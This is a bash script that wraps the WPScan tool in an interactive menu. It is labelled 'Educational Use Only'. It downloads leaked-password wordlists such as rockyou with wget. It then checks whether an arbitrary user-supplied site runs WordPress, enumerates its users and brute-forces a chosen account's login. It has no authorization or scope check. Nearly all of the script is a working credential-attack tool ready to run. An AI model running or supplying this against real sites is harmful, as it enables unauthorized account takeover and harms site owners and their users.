#!/bin/bash

# WPScan Tool with Multiple Wordlists + Custom (Educational Use Only)

# Built-in wordlists and download URLs
WORDLISTS=(
    "/tmp/rockyou.txt"
    "/tmp/darkc0de.lst"
    "/tmp/10k_most_common.txt"
)
NAMES=("rockyou.txt" "darkc0de.lst" "10k_most_common.txt")
URLS=(
    "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt"
    "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/darkc0de.lst"
    "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt"
)

echo "=============================="
echo "     WPScan Tool Menu"
echo "=============================="

read -p "Enter the target URL (e.g., https://example.com): " TARGET

# Download any missing wordlists
for i in "${!WORDLISTS[@]}"; do
    if [ ! -f "${WORDLISTS[$i]}" ]; then
        echo "Downloading ${NAMES[$i]}..."
        wget -q "${URLS[$i]}" -O "${WORDLISTS[$i]}"
        if [ $? -ne 0 ]; then
            echo "❌ Failed to download ${NAMES[$i]}"
            exit 1
        fi
    fi
done

while true; do
    echo ""
    echo "Choose an option:"
    echo "1) Check if site is WordPress"
    echo "2) Enumerate users"
    echo "3) Brute-force login with selected wordlist"
    echo "4) Exit"
    read -p "Option: " OPTION

    case $OPTION in
        1)
            echo "Scanning for WordPress..."
            wpscan --url "$TARGET"
            ;;
        2)
            echo "Enumerating users..."
            wpscan --url "$TARGET" --enumerate u
            ;;
        3)
            read -p "Enter username to attack: " USERNAME
            echo "Choose a wordlist:"
            for i in "${!NAMES[@]}"; do
                echo "$((i+1))) ${NAMES[$i]}"
            done
            echo "$(( ${#NAMES[@]} + 1 ))) Custom wordlist (your file path)"
            read -p "Option [1-$(( ${#NAMES[@]} + 1 ))]: " WORDLIST_OPTION

            if [[ $WORDLIST_OPTION -ge 1 && $WORDLIST_OPTION -le ${#NAMES[@]} ]]; then
                INDEX=$((WORDLIST_OPTION - 1))
                CHOSEN_WORDLIST="${WORDLISTS[$INDEX]}"
                echo "Using ${NAMES[$INDEX]}"
            elif [[ $WORDLIST_OPTION -eq $(( ${#NAMES[@]} + 1 )) ]]; then
                read -p "Enter full path to your wordlist file: " CUSTOM_PATH
                if [[ -f "$CUSTOM_PATH" ]]; then
                    CHOSEN_WORDLIST="$CUSTOM_PATH"
                    echo "Using your wordlist: $CHOSEN_WORDLIST"
                else
                    echo "❌ File not found: $CUSTOM_PATH"
                    continue
                fi
            else
                echo "❌ Invalid selection"
                continue
            fi

            wpscan --url "$TARGET" --usernames "$USERNAME" --passwords "$CHOSEN_WORDLIST"
            ;;
        4)
            echo "Exiting."
            break
            ;;
        *)
            echo "Invalid option."
            ;;
    esac
done
